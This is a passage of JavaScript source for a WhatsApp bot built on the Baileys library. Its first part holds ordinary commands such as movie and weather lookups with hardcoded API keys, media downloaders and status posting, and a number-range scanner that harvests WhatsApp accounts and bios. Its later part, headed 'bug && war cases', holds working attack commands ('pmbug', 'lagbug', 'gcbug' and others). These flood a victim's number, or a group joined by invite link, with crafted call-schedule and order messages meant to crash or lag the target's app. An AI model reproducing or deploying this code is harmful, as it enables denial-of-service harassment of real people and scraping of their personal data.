        if (!text) return replygcnhd(`_Name a Series or movie`);
        await NhdStickWait();
        let fids = await axios.get(
          `http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`
        );
        let imdbt = "";
        console.log(fids.data);
        imdbt +=
          "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n";
        imdbt += "🎬Title      : " + fids.data.Title + "\n";
        imdbt += "📅Year       : " + fids.data.Year + "\n";
        imdbt += "⭐Rated      : " + fids.data.Rated + "\n";
        imdbt += "📆Released   : " + fids.data.Released + "\n";
        imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n";
        imdbt += "🌀Genre      : " + fids.data.Genre + "\n";
        imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n";
        imdbt += "✍Writer     : " + fids.data.Writer + "\n";
        imdbt += "👨Actors     : " + fids.data.Actors + "\n";
        imdbt += "📃Plot       : " + fids.data.Plot + "\n";
        imdbt += "🌐Language   : " + fids.data.Language + "\n";
        imdbt += "🌍Country    : " + fids.data.Country + "\n";
        imdbt += "🎖️Awards     : " + fids.data.Awards + "\n";
        imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n";
        imdbt += "🏙️Production : " + fids.data.Production + "\n";
        imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n";
        imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + "";
        NhdBotFunc.sendMessage(
          m.chat,
          {
            image: {
              url: fids.data.Poster,
            },
            caption: imdbt,
          },
          {
            quoted: m,
          }
        );
        break;
      case "weather":
        {
          if (!text) return replygcnhd("What location?");
          let wdata = await axios.get(
            `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
          );
          let textw = "";
          textw += `*🗺️Weather of  ${text}*\n\n`;
          textw += `*Weather:-* ${wdata.data.weather[0].main}\n`;
          textw += `*Description:-* ${wdata.data.weather[0].description}\n`;
          textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`;
          textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`;
          textw += `*Pressure:-* ${wdata.data.main.pressure}\n`;
          textw += `*Humidity:-* ${wdata.data.main.humidity}\n`;
          textw += `*Humidity:-* ${wdata.data.wind.speed}\n`;
          textw += `*Latitude:-* ${wdata.data.coord.lat}\n`;
          textw += `*Longitude:-* ${wdata.data.coord.lon}\n`;
          textw += `*Country:-* ${wdata.data.sys.country}\n`;

          NhdBotFunc.sendMessage(
            m.chat,
            {
              text: textw,
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "wanumber":
      case "nowa":
      case "searchno":
      case "searchnumber":
        {
          if (!text)
            return replygcnhd(
              `Provide Number with last number x\n\nExample: ${
                prefix + command
              } 91690913721x`
            );
          var inputnumber = text.split(" ")[0];

          replygcnhd(`Searching for WhatsApp account in given range...`);
          function countInstances(string, word) {
            return string.split(word).length - 1;
          }
          var number0 = inputnumber.split("x")[0];
          var number1 = inputnumber.split("x")[countInstances(inputnumber, "x")]
            ? inputnumber.split("x")[countInstances(inputnumber, "x")]
            : "";
          var random_length = countInstances(inputnumber, "x");
          var randomxx;
          if (random_length == 1) {
            randomxx = 10;
          } else if (random_length == 2) {
            randomxx = 100;
          } else if (random_length == 3) {
            randomxx = 1000;
          }
          var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`;
          var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`;
          var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`;
          for (let i = 0; i < randomxx; i++) {
            var nu = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
            var status1 = nu[Math.floor(Math.random() * nu.length)];
            var status2 = nu[Math.floor(Math.random() * nu.length)];
            var status3 = nu[Math.floor(Math.random() * nu.length)];
            var dom4 = nu[Math.floor(Math.random() * nu.length)];
            var random21;
            if (random_length == 1) {
              random21 = `${status1}`;
            } else if (random_length == 2) {
              random21 = `${status1}${status2}`;
            } else if (random_length == 3) {
              random21 = `${status1}${status2}${status3}`;
            } else if (random_length == 4) {
              random21 = `${status1}${status2}${status3}${dom4}`;
            }
            var anu = await NhdBotFunc.onWhatsApp(
              `${number0}${i}${number1}@s.whatsapp.net`
            );
            var anuu = anu.length !== 0 ? anu : false;
            try {
              try {
                var anu1 = await NhdBotFunc.fetchStatus(anu[0].jid);
              } catch {
                var anu1 = "401";
              }
              if (anu1 == "401" || anu1.status.length == 0) {
                nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`;
              } else {
                text66 += `🪀 *Number:* wa.me/${
                  anu[0].jid.split("@")[0]
                }\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(
                  anu1.setAt
                )
                  .tz("Asia/Kolkata")
                  .format("HH:mm:ss DD/MM/YYYY")}\n\n`;
              }
            } catch {
              nowhatsapp += `${number0}${i}${number1}\n`;
            }
          }
          replygcnhd(`${text66}${nobio}${nowhatsapp}`);
        }
        break;
      case "idgroup":
      case "groupid":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          let getGroups = await NhdBotFunc.groupFetchAllParticipating();
          let groups = Object.entries(getGroups)
            .slice(0)
            .map((entry) => entry[1]);
          let anu = groups.map((v) => v.id);
          let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`;
          for (let x of anu) {
            let metadata2 = await NhdBotFunc.groupMetadata(x);
            teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`;
          }
          replygcnhd(
            teks +
              `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`
          );
        }
        break;
      case "getcontact":
      case "getcon":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!(isGroupAdmins || NhdTheCreator)) return NhdStickAdmin();
          nhdbigpp = await NhdBotFunc.sendMessage(
            m.chat,
            {
              text: `\nGroup; *${groupMetadata.subject}*\nMember; *${participants.length}*`,
            },
            { quoted: m, ephemeralExpiration: 86400 }
          );
          await sleep(1000);
          NhdBotFunc.sendContact(
            m.chat,
            participants.map((a) => a.id),
            nhdbigpp
          );
        }
        break;
      case "savecontact":
      case "svcontact":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!(isGroupAdmins || NhdTheCreator)) return NhdStickAdmin();
          let cmiggc = await NhdBotFunc.groupMetadata(m.chat);
          let orgiggc = participants.map((a) => a.id);
          vcard = "";
          noPort = 0;
          for (let a of cmiggc.participants) {
            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${
              a.id.split("@")[0]
            }\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${
              a.id.split("@")[0]
            }\nEND:VCARD\n`;
          }
          let nmfilect = "./contacts.vcf";
          replygcnhd(
            "\nBe patient bro, saving... " +
              cmiggc.participants.length +
              " contact"
          );
          require("fs").writeFileSync(nmfilect, vcard.trim());
          await sleep(2000);
          NhdBotFunc.sendMessage(
            m.chat,
            {
              document: require("fs").readFileSync(nmfilect),
              mimetype: "text/vcard",
              fileName: "Contact.vcf",
              caption:
                "\nSucceed\nGroup: *" +
                cmiggc.subject +
                "*\nContact: *" +
                cmiggc.participants.length +
                "*",
            },
            { ephemeralExpiration: 86400, quoted: m }
          );
          require("fs").unlinkSync(nmfilect);
        }
        break;
      case "sendcontact":
      case "sencontact":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!m.mentionedJid[0])
            return replygcnhd(
              "\nUse like this\n Example:.sendcontact @tag|name"
            );
          let snTak = text.split(" ")[1] ? text.split(" ")[1] : "Contact";
          let snContact = {
            displayName: "Contact",
            contacts: [
              {
                displayName: snTak,
                vcard:
                  "BEGIN:VCARD\nVERSION:3.0\nN:;" +
                  snTak +
                  ";;;\nFN:" +
                  snTak +
                  "\nitem1.TEL;waid=" +
                  m.mentionedJid[0].split("@")[0] +
                  ":" +
                  m.mentionedJid[0].split("@")[0] +
                  "\nitem1.X-ABLabel:Mobile\nEND:VCARD",
              },
            ],
          };
          NhdBotFunc.sendMessage(
            m.chat,
            { contacts: snContact },
            { ephemeralExpiration: 86400 }
          );
        }
        break;
      case "contacttag":
      case "contag":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!(isGroupAdmins || NhdTheCreator)) return NhdStickAdmin();
          if (!m.mentionedJid[0])
            return replygcnhd(
              "\nUse like this\n Example:.contacttag @tag|name"
            );
          let sngTak = text.split(" ")[1] ? text.split(" ")[1] : "Contact";
          let sngContact = {
            displayName: "Contact",
            contacts: [
              {
                displayName: sngTak,
                vcard:
                  "BEGIN:VCARD\nVERSION:3.0\nN:;" +
                  sngTak +
                  ";;;\nFN:" +
                  sngTak +
                  "\nitem1.TEL;waid=" +
                  m.mentionedJid[0].split("@")[0] +
                  ":" +
                  m.mentionedJid[0].split("@")[0] +
                  "\nitem1.X-ABLabel:Mobile\nEND:VCARD",
              },
            ],
          };
          NhdBotFunc.sendMessage(
            m.chat,
            { contacts: sngContact, mentions: participants.map((a) => a.id) },
            { ephemeralExpiration: 86400 }
          );
        }
        break;
      case "ai":
      case "openai":
        {
          if (!text) return replygcnhd("What is your question?");
          let d = await fetchJson(
            `https://vihangayt.me/tools/chatgpt4?q=${text}`
          );
          replygcnhd(d.data);
        }
        break;
      case "mathsai":
        {
          if (!text) return replygcnhd("What is your question?");
          let d = await fetchJson(
            `https://vihangayt.me/tools/mathssolve?q=${text}`
          );
          replygcnhd(d.data);
        }
        break;
      case "igvideo":
      case "igvid":
        {
          if (!q) return replygcnhd("Link?");
          let res = await fetch(
            `https://vihangayt.me/download/instagram?url=${q}`
          );
          let json = await res.json();
          NhdBotFunc.sendMessage(
            m.chat,
            { video: { url: json.data.data[0].url }, caption: mess.success },
            { quoted: m }
          ).catch(console.error);
        }
        break;
      case "igimage":
      case "igimg":
        {
          if (!text) return replygcnhd("Link?");
          let resnhd = await fetch(
            `https://vihangayt.me/download/instagram?url=${text}`
          );
          let jsonnhd = await resnhd.json();
          NhdBotFunc.sendMessage(
            m.chat,
            {
              image: { url: jsonnhd.data.data[0].url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch(console.error);
        }
        break;
      case "apk":
      case "apkdl":
        {
          if (!text) return replygcnhd("What apk u wanna download?");
          let resnhd = await fetch(
            `https://vihangayt.me/download/apk?id=${text}`
          );
          let jsonnhd = await resnhd.json();
          NhdBotFunc.sendMessage(
            from,
            {
              document: { url: jsonnhd.data.dllink },
              fileName: jsonnhd.data.name,
              mimetype: "application/vnd.android.package-archive",
            },
            { quoted: m }
          ).catch(console.error);
        }
        break;
      case "telestick":
        {
          if (m.isGroup) return NhdStickPrivate();
          if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
            let nhdresources = await Telesticker(args[0]);
            await replygcnhd(`Sending ${nhdresources.length} stickers...`);
            if (m.isGroup && nhdresources.length > 30) {
              await replygcnhd(
                "Number of stickers more than 30, bot will send it in private chat."
              );
              for (let i = 0; i < nhdresources.length; i++) {
                NhdBotFunc.sendMessage(m.sender, {
                  sticker: { url: nhdresources[i].url },
                });
              }
            } else {
              for (let i = 0; i < nhdresources.length; i++) {
                NhdBotFunc.sendMessage(m.chat, {
                  sticker: { url: nhdresources[i].url },
                });
              }
            }
          } else
            replygcnhd(
              `Where is the telegram sticker link?\nExample. ${
                prefix + command
              } https://t.me/addstickers/FriendlyDeath`
            );
        }
        break;
      case "tesyjdjdjdjdksksk":
        {
          if (!args[0])
            return replygcnhd(
              `Enter what you want to search \n\n📌*Example:*\n${
                prefix + command
              } cheems`
            );
          const fg = require("api-dylux");
          try {
            let json = await fg.StickerSearch(text);
            replygcnhd(`
▢ *Title:* ${json.title}
▢ *Total stickers:* ${json.sticker_url.length}
▢ *Estimated shipping time:* _*${json.sticker_url.length * 2} s*_`);
            for (let i of json.sticker_url) {
              NhdBotFunc.sendMessage(m.sender, {
                sticker: { url: json.sticker_url },
              });
            }
          } catch (e) {
            replygcnhd(`Error!!!`);
          }
        }
        break;
      case "circlevideo":
        {
          try {
            const nhdbaileys =
              await require("@whiskeysockets/baileys").generateWAMessageContent(
                { video: await m.quoted.download() },
                { upload: NhdBotFunc.waUploadToServer }
              );
            await NhdBotFunc.relayMessage(
              from,
              { ptvMessage: { ...nhdbaileys.videoMessage } },
              {}
            );
          } catch (err) {
            replygcnhd(`Reply to a Video with Caption ${prefix + command}`);
          }
        }
        break;
      case "statustext":
      case "upswtext":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (!q) return replygcnhd("Text?");
          await NhdBotFunc.sendMessage(
            "status@broadcast",
            { text: q },
            {
              backgroundColor: "#FFC0CB",
              font: 3,
              statusJidList: Object.keys(global.db.users),
            }
          );
          replygcnhd(`Successfully uploaded, please check the status`);
        }
        break;
      case "statusvideo":
      case "upswvideo":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          await NhdStickWait();
          if (/video/.test(mime)) {
            var NhdSwVid = await NhdBotFunc.downloadAndSaveMediaMessage(quoted);
            await NhdBotFunc.sendMessage(
              "status@broadcast",
              {
                video: {
                  url: NhdSwVid,
                },
                caption: q ? q : "",
              },
              { statusJidList: Object.keys(global.db.users) }
            );
            await replygcnhd(`Successfully uploaded, please check the status`);
          } else {
            replygcnhd("Reply to video");
          }
        }
        break;
      case "statusimage":
      case "upswimage":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          await NhdStickWait();
          if (/image/.test(mime)) {
            var NhdSwImg = await NhdBotFunc.downloadAndSaveMediaMessage(quoted);
            await NhdBotFunc.sendMessage(
              "status@broadcast",
              {
                image: {
                  url: NhdSwImg,
                },
                caption: q ? q : "",
              },
              { statusJidList: Object.keys(global.db.users) }
            );
            await replygcnhd(`Successfully uploaded, please check the status`);
          } else {
            replygcnhd("Reply to image");
          }
        }
        break;
      case "statusaudio":
      case "upswaudio":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          await NhdStickWait();
          if (/audio/.test(mime)) {
            var NhdSwAud = await NhdBotFunc.downloadAndSaveMediaMessage(quoted);
            await NhdBotFunc.sendMessage(
              "status@broadcast",
              {
                audio: {
                  url: NhdSwAud,
                },
                mimetype: "audio/mp4",
                ptt: true,
              },
              {
                backgroundColor: "#FFC0CB",
                statusJidList: Object.keys(global.db.users),
              }
            );
            await replygcnhd(`Successfully uploaded, please check the status`);
          } else {
            replygcnhd("Reply to audio!");
          }
        }
        break;
      //bug && war cases
      //⚠️do not edit cases otherwise bug not work
      //bug cases
      case "amountbug":
        {
          if (!isPrem) return replygcnhd(mess.premium);
          if (!args[0])
            return relygcnhd(
              `Use ${prefix + command} amount\nExample ${prefix + command} 5`
            );
          amount = `${encodeURI(text)}`;
          for (let i = 0; i < amount; i++) {
            const nhdybug1 = `${nhdtext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: nhdybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            NhdBotFunc.relayMessage(
              from,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
        }
        replygcnhd(
          `*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`
        );
        break;
      case "pmbug":
        {
          if (!isPrem) return replygcnhd(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const nhdybug1 = `${nhdtext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: nhdybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            NhdBotFunc.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
        }
        replygcnhd(
          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "delaybug":
        {
          if (!isPrem) return replygcnhd(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const nhdybug1 = nhdtext2;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: nhdybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            NhdBotFunc.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
        }
        replygcnhd(
          `*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "docubug":
        {
          if (!isPrem) return replygcnhd(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          await loading();
          if (args.length < 1)
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "15";
          for (let i = 0; i < amount; i++) {
            const nhdybug1 = `${nhdtext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: nhdybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            NhdBotFunc.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
        }
        replygcnhd(
          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "unlimitedbug":
        {
          if (!isPrem) return replygcnhd(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const nhdybug1 = nhdtext3;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: nhdybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            NhdBotFunc.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
        }
        replygcnhd(
          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "bombug":
        {
          if (!isPrem) return replygcnhd(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const nhdybug1 = nhdtext4;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: nhdybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            NhdBotFunc.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
        }
        replygcnhd(
          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "lagbug":
        {
          if (!isPrem) return replygcnhd(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const nhdybug1 = nhdtext2;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: nhdybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            NhdBotFunc.relayMessage(
              victim,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
        }
        replygcnhd(
          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
        );
        break;
      case "trollybug":
        {
          if (!isPrem) return replygcnhd(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916909137213`
            );
          await loading();
          victim = text.split("|")[0] + "@s.whatsapp.net";
          amount = "15";
          for (let i = 0; i < amount; i++) {
            var order = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                orderMessage: {
                  orderId: "599519108102353",
                  thumbnail: thumb,
                  itemCount: 1999,
                  status: "INQUIRY",
                  surface: "CATALOG",
                  message: `${botname}`,
                  orderTitle: " TROLLY BUG ",
                  sellerJid: "916909137213@s.whatsapp.net",
                  token: "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==",
                },
              }),
              { userJid: from, quoted: m }
            );
            NhdBotFunc.relayMessage(victim, order.message, {
              messageId: order.key.id,
            });
          }
          replygcnhd(
            `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
          );
        }
        break;
      case "gcbug":
        {
          if (!isPrem) return replygcnhd(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let nhdgc = await NhdBotFunc.groupAcceptInvite(result);
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const nhdybug1 = `${nhdtext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: nhdybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            NhdBotFunc.relayMessage(
              nhdgc,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
          replygcnhd(
            `*Successfully sent Bug To ${nhdgc} Please pause for 3 minutes*`
          );
        }
        break;
      case "delaygcbug":
        {
          if (!isPrem) return replygcnhd(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let nhdgc = await NhdBotFunc.groupAcceptInvite(result);
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const nhdybug1 = nhdtext5;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: nhdybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            NhdBotFunc.relayMessage(
              nhdgc,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
          replygcnhd(
            `*Successfully sent Bug To ${nhdgc} Please pause for 3 minutes*`
          );
        }
        break;
      case "laggcbug":
        {
          if (!isPrem) return replygcnhd(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let nhdgc = await NhdBotFunc.groupAcceptInvite(result);
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const nhdybug1 = nhdtext2;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: nhdybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            NhdBotFunc.relayMessage(
              nhdgc,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
          replygcnhd(
            `*Successfully sent Bug To ${nhdgc} Please pause for 3 minutes*`
          );
        }
        break;
      case "bomgcbug":
        {
          if (!isPrem) return replygcnhd(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let nhdgc = await haikal.groupAcceptInvite(result);
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const nhdybug1 = nhdtext4;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: nhdybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            NhdBotFunc.relayMessage(
              nhdgc,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
          replygcnhd(
            `*Successfully sent Bug To ${nhdgc} Please pause for 3 minutes*`
          );
        }
        break;
      case "unlimitedgcbug":
        {
          if (!isPrem) return replygcnhd(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let nhdgc = await NhdBotFunc.groupAcceptInvite(result);
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const nhdybug1 = nhdtext3;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: nhdybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            NhdBotFunc.relayMessage(
              nhdgc,
              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
          replygcnhd(
            `*Successfully sent Bug To ${nhdgc} Please pause for 3 minutes*`
          );
        }
        break;
      case "trollygcbug":
        {
          if (!isPrem) return replygcnhd(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let nhdgc = await NhdBotFunc.groupAcceptInvite(result);
          amount = "15";
          for (let i = 0; i < amount; i++) {
            var order = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                orderMessage: {
                  orderId: "599519108102353",
                  thumbnail: thumb,
                  itemCount: 1999,
                  status: "INQUIRY",
                  surface: "CATALOG",
                  message: `${botname}`,
                  orderTitle: " TROLLY BUG ",
                  sellerJid: "916909137213@s.whatsapp.net",
                  token: "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==",
                },
              }),
              { userJid: from, quoted: m }
            );
            NhdBotFunc.relayMessage(nhdgc, order.message, {
              messageId: order.key.id,
            });
          }
          replygcnhd(
            `*Successfully sent Bug To ${nhdgc} Please pause for 3 minutes*`
          );
        }
        break;
      case "docugcbug":
        {
          if (!isPrem) return replygcnhd(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} link\nExample ${
                prefix + command
              } https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
            );
          await loading();
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          let nhdgc = await NhdBotFunc.groupAcceptInvite(result);
          amount = "15";
          for (let i = 0; i < amount; i++) {
            const nhdybug1 = `${nhdtext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
                  callType: "2",
                  scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                  title: nhdybug1,
                },
              }),
              { userJid: from, quoted: m }
            );
            NhdBotFunc.relayMessage(
              nhdgc,
